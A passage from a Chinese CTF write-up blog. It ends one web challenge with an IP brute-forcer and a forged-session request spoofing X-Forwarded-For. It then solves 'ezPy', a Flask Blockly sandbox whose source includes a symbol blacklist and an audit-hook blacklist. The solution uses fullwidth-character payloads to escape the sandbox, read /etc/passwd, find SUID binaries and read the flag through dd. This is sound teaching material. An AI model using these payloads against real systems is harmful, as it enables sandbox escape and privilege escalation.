class="hljs-string">&#x27;6b1ed8&#x27;</span><br>c2=<span class="hljs-string">&#x27;3eb584&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>                ip = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span>.<span class="hljs-subst">&#123;b&#125;</span>.<span class="hljs-subst">&#123;c&#125;</span>.<span class="hljs-subst">&#123;d&#125;</span>&#x27;</span><br><br>                hash1 = SHA256.new((ip + <span class="hljs-string">&quot;1&quot;</span>).encode()).hexdigest()[:<span class="hljs-number">6</span>]<br>                hash2 = SHA256.new((ip + <span class="hljs-string">&quot;2&quot;</span>).encode()).hexdigest()[:<span class="hljs-number">6</span>]<br>                <span class="hljs-keyword">if</span> hash1 == c1 <span class="hljs-keyword">and</span> hash2 == c2:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span>.<span class="hljs-subst">&#123;b&#125;</span>.<span class="hljs-subst">&#123;c&#125;</span>.<span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> Pool(<span class="hljs-number">8</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(brute, <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2025/xiaosai-6.png" srcset="/img/loading.gif" lazyload></p>
<p>最后用伪造的session和ip访问 &#x2F;flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><br><br>url = <span class="hljs-string">&quot;http://10.151.151.41:33095/flag&quot;</span><br>session = <span class="hljs-string">&quot;uTWw0navKW9f0Z/A8ZJUmt3gfO4Ib4No2PMCvz0TM4WclllJg0nO+BTSQk8HwuqbrMb4uVMrBP9FgizvVHfT9M2GXew79EyvaWboOq/MUCzZOIz39N/prMWICZjQ/taUGoC7lLDoYyL2ND2qKd8k2LF0h9jm02c17dBRC3SZx9ZpwIkNiT+5DjKQNTfnF2/AeR+ArRBa90k3cDL8ZWLSryXzWyJeAQ6A61p6j5/RUzntGpgb4rOH33ac+lP8p9SNpRUa5MamLpnQE7mVdiNlXLSYJRX1zuPT8ZpwsaJpjVbGbAtly7gumJkwoe2vZczXQOB6T9KWvnwA/fqB1x0yOrND8Y55fAA==--/ic6Q4XjpPNDE0mF--8BxFTtfWYX0HG3XYa1QLrg==&quot;</span><br><br>response = requests.get(url,cookies=&#123;<span class="hljs-string">&quot;rack.session&quot;</span>:urllib.parse.quote(session)&#125;,headers=&#123;<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>:<span class="hljs-string">&quot;24.12.216.232&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>



<h2 id="ezPy"><a href="#ezPy" class="headerlink" title="ezPy"></a>ezPy</h2><blockquote>
<p>Oh my god, I’m trapped in the cage of Python, who can take me out!<br>Difficulty: Hard</p>
</blockquote>
<p>来自第八届强网杯 积木编程</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> unidecode<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> importlib.util<br><span class="hljs-keyword">import</span> json<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="hljs-literal">False</span><br><br>blacklist_pattern = <span class="hljs-string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">module_exists</span>(<span class="hljs-params">module_name</span>):<br><br>    spec = importlib.util.find_spec(module_name)<br>    <span class="hljs-keyword">if</span> spec <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> module_name <span class="hljs-keyword">in</span> sys.builtin_module_names:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">if</span> spec.origin:<br>        std_lib_path = os.path.dirname(os.__file__)<br><br>        <span class="hljs-keyword">if</span> spec.origin.startswith(std_lib_path) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> spec.origin.startswith(os.getcwd()):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_secure</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> ast.walk(m):<br>        <span class="hljs-keyword">match</span> <span class="hljs-built_in">type</span>(node):<br>            <span class="hljs-keyword">case</span> ast.Import:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: Banned module &quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">case</span> ast.ImportFrom:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ERROR: Banned module <span class="hljs-subst">&#123;node.module&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_for_blacklisted_symbols</span>(<span class="hljs-params">input_text</span>):<br>    <span class="hljs-keyword">if</span> re.search(blacklist_pattern, input_text):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">block_to_python</span>(<span class="hljs-params">block</span>):<br>    block_type = block[<span class="hljs-string">&#x27;type&#x27;</span>]<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">if</span> block_type == <span class="hljs-string">&#x27;print&#x27;</span>:<br>        text_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        text = block_to_python(text_block)<br>        code = <span class="hljs-string">f&quot;print(<span class="hljs-subst">&#123;text&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;math_number&#x27;</span>:<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;NUM&#x27;</span>]).isdigit():<br>            code =  <span class="hljs-built_in">int</span>(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;NUM&#x27;</span>])<br>        <span class="hljs-keyword">else</span>:<br>            code = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;text&#x27;</span>:<br>        <span class="hljs-keyword">if</span> check_for_blacklisted_symbols(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]):<br>            code = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br><br>            code =  <span class="hljs-string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]) + <span class="hljs-string">&quot;&#x27;&quot;</span><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;max&#x27;</span>:<br><br>        a_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;A&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        b_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;B&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        a = block_to_python(a_block)<br>        b = block_to_python(b_block)<br>        code =  <span class="hljs-string">f&quot;max(<span class="hljs-subst">&#123;a&#125;</span>, <span class="hljs-subst">&#123;b&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;min&#x27;</span>:<br>        a_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;A&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        b_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;B&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        a = block_to_python(a_block)<br>        b = block_to_python(b_block)<br>        code =  <span class="hljs-string">f&quot;min(<span class="hljs-subst">&#123;a&#125;</span>, <span class="hljs-subst">&#123;b&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;next&#x27;</span> <span class="hljs-keyword">in</span> block:<br><br>        block = block[<span class="hljs-string">&#x27;next&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br><br>        code +=<span class="hljs-string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> code<br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">json_to_python</span>(<span class="hljs-params">blockly_data</span>):<br>    block = blockly_data[<span class="hljs-string">&#x27;blocks&#x27;</span>][<span class="hljs-string">&#x27;blocks&#x27;</span>][<span class="hljs-number">0</span>]<br><br>    python_code = <span class="hljs-string">&quot;&quot;</span><br>    python_code += block_to_python(block) + <span class="hljs-string">&quot;\n&quot;</span><br><br><br>    <span class="hljs-keyword">return</span> python_code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">source_code</span>):<br>    hook_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_hook(event_name, arg):</span><br><span class="hljs-string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="hljs-string">    if len(event_name) &gt; 4:</span><br><span class="hljs-string">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="hljs-string">    for bad in blacklist:</span><br><span class="hljs-string">        if bad in event_name:</span><br><span class="hljs-string">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(source_code)<br>    code = hook_code + source_code<br>    tree = <span class="hljs-built_in">compile</span>(source_code, <span class="hljs-string">&quot;run.py&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> verify_secure(tree):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;run.py&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(code)<br>            result = subprocess.run([<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="hljs-number">5</span>).stdout.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            os.remove(<span class="hljs-string">&#x27;run.py&#x27;</span>)<br>            <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Execution aborted due to security concerns.&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        os.remove(<span class="hljs-string">&#x27;run.py&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout!&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> app.send_static_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blockly_json</span>():<br>    blockly_data = request.get_data()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(blockly_data))<br>    blockly_data = json.loads(blockly_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(blockly_data)<br>    <span class="hljs-keyword">try</span>:<br>        python_code = json_to_python(blockly_data)<br>        <span class="hljs-keyword">return</span> do(python_code)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Error generating Python code&quot;</span>, <span class="hljs-string">&quot;details&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8083</span>)<br></code></pre></td></tr></table></figure>

<p>使用了unidecode来处理字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist_pattern = <span class="hljs-string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><br><br><span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;text&#x27;</span>:<br>    <span class="hljs-keyword">if</span> check_for_blacklisted_symbols(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]):<br>        code = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        code =  <span class="hljs-string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]) + <span class="hljs-string">&quot;&#x27;&quot;</span><br></code></pre></td></tr></table></figure>

<p>unidecode的一个特性是可以将全角字符转为半角后正常识别，可以通过这个特性来绕过黑名单</p>
<p><img src="/img/wp/2025/xiaosai-7.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 半角 ⇔ 全角 変換</span><br><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_halfwidth</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> unicodedata.normalize(<span class="hljs-string">&#x27;NFKC&#x27;</span>, text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">to_fullwidth</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) + <span class="hljs-number">0xFEE0</span>) <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;!&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;~&#x27;</span> <span class="hljs-keyword">else</span> c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text)<br><br><br>str1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">hello</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(to_fullwidth(str1))<br></code></pre></td></tr></table></figure>


<p>可以读文件，但是读不了flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ｓ＇）\nｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂，　＂ｒ＂）．ｒｅａｄ（））\n＃<br></code></pre></td></tr></table></figure>



<p>在do中还拼接了一段函数，对长度进行了限制，可以通过重写len函数，让它返回一个固定的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">len</span> = <span class="hljs-keyword">lambda</span> x:<span class="hljs-number">0</span>;<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;aaaaa&#x27;</span>))<br></code></pre></td></tr></table></figure>


<p>然后构造命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;;__import__(&quot;builtins&quot;).len=lambda x:0;print(__import__(&quot;os&quot;).system(&quot;ls /&quot;));&#x27;</span><br><br>＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ　ｘ：０；ｐｒｉｎｔ（＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｌｓ　／＂））；＇<br></code></pre></td></tr></table></figure>

<p>suid 提权</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;;__import__(&quot;builtins&quot;).len=lambda x:0;print(__import__(&quot;os&quot;).system(&quot;find / -perm -u=s -type f 2&gt;/dev/null&quot;));&#x27;</span><br><br>＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ　ｘ：０；ｐｒｉｎｔ（＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｆｉｎｄ　／　－ｐｅｒｍ　－ｕ＝ｓ　－ｔｙｐｅ　ｆ　２＞／ｄｅｖ／ｎｕｌｌ＂））；＇<br></code></pre></td></tr></table></figure>

<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/usr/bin/chfn<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chsh</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/dd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/gpasswd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/mount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/su</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/umount</span><br></code></pre></td></tr></table></figure>

<p>读flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;;__import__(&quot;builtins&quot;).len=lambda x:0;print(__import__(&quot;os&quot;).system(&quot;dd if=/flag&quot;));&#x27;</span><br><br>＇；＿＿ｉｍｐｏｒｔ＿＿（＂ｂｕｉｌｔｉｎｓ＂）．ｌｅｎ＝ｌａｍｂｄａ　ｘ：０；ｐｒｉｎｔ（＿＿ｉｍｐｏｒｔ＿＿（＂ｏｓ＂）．ｓｙｓｔｅｍ（＂ｄｄ　ｉｆ＝／ｆｌａｇ＂））；＇<br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/wp/" class="category-chain-item">wp</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/wp/" class="print-no-link">#wp</a>
      
        <a href="/tags/2025%E7%AB%9E%E8%B5%9B/" class="print-no-link">#2025竞赛</a>
      
        <a href="/tags/%E6%A0%A1%E8%B5%9B/" class="print-no-link">#校赛</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2025校赛wp</div>
      <div>https://www.dr0n.top/posts/806c3419/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>dr0n</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年10月22日</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>更新于</div>
          <div>2025年12月29日</div>
        </div>
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
                    <i class="iconfont icon-cc-nc"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
                    <i class="iconfont icon-cc-nd"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/posts/7d7c5c9c/" title="春秋云境 Brute4Road">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">春秋云境 Brute4Road</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/posts/533e6c98/" title="内网渗透学习(其他篇)">
                        <span class="hidden-mobile">内网渗透学习(其他篇)</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="waline"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#waline', function() {
      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.15.8/waline.css')
      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.15.8/waline.js', function() {
        var options = Object.assign(
          {"serverURL":"https://waline.dr0n.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
          {
            el: '#waline',
            path: window.location.pathname
          }
        )
        Waline.init(options);
        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
          var imgSelector = '#waline .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
